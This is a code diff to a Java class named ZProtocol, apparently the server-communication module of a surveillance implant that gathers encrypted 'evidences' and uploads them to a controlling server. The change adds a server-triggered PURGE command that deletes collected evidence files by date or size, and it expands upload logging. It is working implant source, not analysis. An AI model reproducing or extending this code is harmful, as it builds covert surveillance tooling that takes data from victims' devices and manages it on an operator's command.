@@ -108,6 +108,7 @@ public class ZProtocol extends Protocol {
 
 			final boolean[] capabilities = identification();
 
+			purge(capabilities[Proto.PURGE]);
 			newConf(capabilities[Proto.NEW_CONF]);
 			download(capabilities[Proto.DOWNLOAD]);
 			upload(capabilities[Proto.UPLOAD]);
@@ -205,6 +206,16 @@ public class ZProtocol extends Protocol {
 		final boolean[] capabilities = parseIdentification(response);
 
 		return capabilities;
+	}
+
+	private void purge(final boolean cap) throws TransportException, ProtocolException {
+		if (cap && haveStorage) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Info: ***** PURGE *****"); //$NON-NLS-1$
+			}
+			final byte[] response = command(Proto.PURGE);
+			parsePurge(response);
+		}
 	}
 
 	/**
@@ -570,9 +581,9 @@ public class ZProtocol extends Protocol {
 					final int cap = dataBuffer.readInt();
 					if (cap < Proto.LASTTYPE) {
 						capabilities[cap] = true;
-					}
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " capabilities: " + capabilities[i]); //$NON-NLS-1$
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " capabilities: " + capabilities[i]); //$NON-NLS-1$
+						}
 					}
 				}
 
@@ -598,6 +609,31 @@ public class ZProtocol extends Protocol {
 		}
 
 		return capabilities;
+	}
+
+	protected void parsePurge(byte[] result) throws ProtocolException {
+
+		int res = Utils.byteArrayToInt(result, 0);
+		if (res == Proto.OK) {
+			final int len = Utils.byteArrayToInt(result, 4);
+			if (len >= 12) {
+
+				long time = Utils.byteArrayToLong(result, 8);
+				int size = Utils.byteArrayToInt(result, 16);
+
+				Date date = null;
+				if (time > 0) {
+					date = new Date(time * 1000);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parsePurge): date: " + date + " size: " + size);
+				}
+
+				purgeEvidences(Path.logs(), date, size);
+			}
+
+		}
 	}
 
 	/**
@@ -901,6 +937,56 @@ public class ZProtocol extends Protocol {
 		}
 	}
 
+	protected void purgeEvidences(final String basePath, Date date, int size) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " Info: purgeEvidences from: " + basePath); //$NON-NLS-1$
+		}
+		final EvidenceCollector logCollector = EvidenceCollector.self();
+
+		final Vector dirs = logCollector.scanForDirLogs(basePath);
+
+		final int dsize = dirs.size();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " purgeEvidences #directories: " + dsize); //$NON-NLS-1$
+		}
+
+		for (int i = 0; i < dsize; ++i) {
+			final String dir = (String) dirs.elementAt(i); // per reverse:
+															// dsize-i-1
+			final String[] logs = logCollector.scanForEvidences(basePath, dir);
+
+			final int lsize = logs.length;
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+
+			for (final String logName : logs) {
+				final String fullLogName = basePath + dir + logName;
+				final AutoFile file = new AutoFile(fullLogName);
+
+				if (file.exists()) {
+					if (size > 0 && file.getSize() > size) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (purgeEvidences): removing due size: "
+									+ EvidenceCollector.decryptName(logName));
+						}
+
+						file.delete();
+					} else if (date != null && file.lastModified() < date.getTime()) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (purgeEvidences): removing due date: "
+									+ EvidenceCollector.decryptName(logName));
+						}
+
+						file.delete();
+					}
+				}
+			}
+		}
+	}
+
 	/**
 	 * Send evidences.
 	 * 
@@ -971,7 +1057,8 @@ public class ZProtocol extends Protocol {
 				}
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " Info: Sending file: " + EvidenceCollector.decryptName(logName)); //$NON-NLS-1$
+					Check.log(TAG
+							+ " Info: Sending file: " + EvidenceCollector.decryptName(logName) + " size: " + file.getSize() + " date: " + file.getFileTime()); //$NON-NLS-1$
 				}
 
 				final byte[] plainOut = new byte[content.length + 4];
